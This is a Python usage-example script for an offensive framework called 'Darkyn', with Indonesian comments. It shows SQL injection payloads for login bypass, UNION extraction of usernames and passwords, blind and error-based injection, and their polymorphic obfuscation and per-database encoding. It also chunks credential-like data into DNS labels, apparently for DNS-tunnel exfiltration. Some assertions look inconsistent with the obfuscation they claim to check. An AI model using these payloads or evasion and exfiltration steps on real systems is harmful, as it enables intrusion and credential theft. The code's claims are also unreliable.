# examples/basic_usage.py
"""
Contoh penggunaan basic Darkyn Framework.
DISCLAIMER: Hanya untuk authorized penetration testing!
"""

from darkyn.core.crypto import QuantumCryptoDNS
from darkyn.attack.polymorphic import PolymorphicEngine

# ============================================================================
# Example 1: Quantum Crypto - Encrypt & Decrypt
# ============================================================================
def example_crypto():
    print("\n[*] Example 1: Quantum Crypto Encryption/Decryption")
    print("=" * 60)

    crypto = QuantumCryptoDNS()

    # Encrypt data
    original = "SELECT database() FROM information_schema.tables"
    encrypted = crypto.encrypt(original, layer=7)

    print(f"Original:  {original}")
    print(f"Encrypted: {encrypted[:80]}...")

    # Decrypt
    decrypted = crypto.decrypt(encrypted)
    print(f"Decrypted: {decrypted}")

    # Verify
    assert original == decrypted, "Encryption/decryption mismatch!"
    print("[✓] Encryption verified!")


# ============================================================================
# Example 2: Polymorphic Payload Generation
# ============================================================================
def example_polymorphic():
    print("\n[*] Example 2: Polymorphic Payload Obfuscation")
    print("=" * 60)

    original_payload = "' UNION SELECT username, password FROM users--"

    print(f"Original payload:\n  {original_payload}\n")

    # Generate variants dengan obfuscation
    variants = PolymorphicEngine.generate_variants(
        original_payload,
        db_type="mysql",
        count=3
    )

    print("Generated variants (semantically identical):")
    for i, variant in enumerate(variants, 1):
        print(f"  [{i}] {variant[:70]}...")

    # Verify semantics (lowercase versions should match)
    for v in variants:
        assert v.lower() == original_payload.lower(), "Variant semantic mismatch!"
    print("\n[✓] All variants verified!")


# ============================================================================
# Example 3: Database-Specific Payload Encoding
# ============================================================================
def example_db_encoding():
    print("\n[*] Example 3: Database-Specific String Encoding")
    print("=" * 60)

    payload = "' OR 'admin'='admin"

    print(f"Original: {payload}\n")

    # Encode untuk berbagai database
    dbs = ["mysql", "postgresql", "mssql", "oracle"]

    for db in dbs:
        encoded = PolymorphicEngine.encode_strings(payload, db_type=db)
        print(f"{db.upper():12} → {encoded[:60]}...")

    print("\n[✓] Encoding untuk semua DB successful!")


# ============================================================================
# Example 4: DNS Encoding/Decoding (Out-of-order resilience)
# ============================================================================
def example_dns_tunnel():
    print("\n[*] Example 4: DNS Encoding/Decoding dengan Out-of-Order Chunks")
    print("=" * 60)

    crypto = QuantumCryptoDNS()

    # Data panjang yang akan di-chunk
    long_data = "users:admin:password123|users:root:securepass|data:test:value"

    # Encode ke chunks dengan sequence number
    chunks = crypto.dns_encode(long_data, max_label_len=15)

    print(f"Original data length: {len(long_data)} chars")
    print(f"Chunks created: {len(chunks)}")
    print(f"Chunks: {chunks}\n")

    # Shuffle chunks (simulate out-of-order delivery)
    import random
    shuffled_chunks = chunks.copy()
    random.shuffle(shuffled_chunks)

    print(f"Shuffled order: {[c['seq'] for c in shuffled_chunks]}")

    # Decode - harus auto-sort by seq
    decoded = crypto.dns_decode(shuffled_chunks)

    print(f"Decoded data: {decoded}")
    assert long_data == decoded, "DNS decode failed!"
    print("[✓] DNS encoding/decoding with out-of-order resilience verified!")


# ============================================================================
# Example 5: SQL Injection Payload Testing
# ============================================================================
def example_sqli_payloads():
    print("\n[*] Example 5: SQL Injection Payload Variants")
    print("=" * 60)

    # Multiple SQLi techniques
    payloads = [
        ("' OR 1=1--", "Authentication Bypass"),
        ("' UNION SELECT NULL,NULL,NULL--", "Union-Based Extraction"),
        ("' AND SLEEP(5)--", "Time-Based Blind"),
        ("' AND extractvalue(1,concat(0x7e,database()))--", "Error-Based"),
    ]

    for payload, technique in payloads:
        print(f"\n[{technique}]")
        print(f"  Base:     {payload}")

        # Generate polymorphic variants
        variant = PolymorphicEngine.obfuscate(payload, level=3)
        print(f"  Obfuscated: {variant[:70]}...")

    print("\n[✓] SQLi payloads generated successfully!")


if __name__ == "__main__":
    print("\n╔══════════════════════════════════════════════════════════════╗")
    print("║          DARKYN FRAMEWORK v2.0 - BASIC EXAMPLES              ║")
    print("║     For authorized penetration testing only!                 ║")
    print("╚══════════════════════════════════════════════════════════════╝")

    example_crypto()
    example_polymorphic()
    example_db_encoding()
    example_dns_tunnel()
    example_sqli_payloads()

    print("\n[✓] All examples completed successfully!\n")
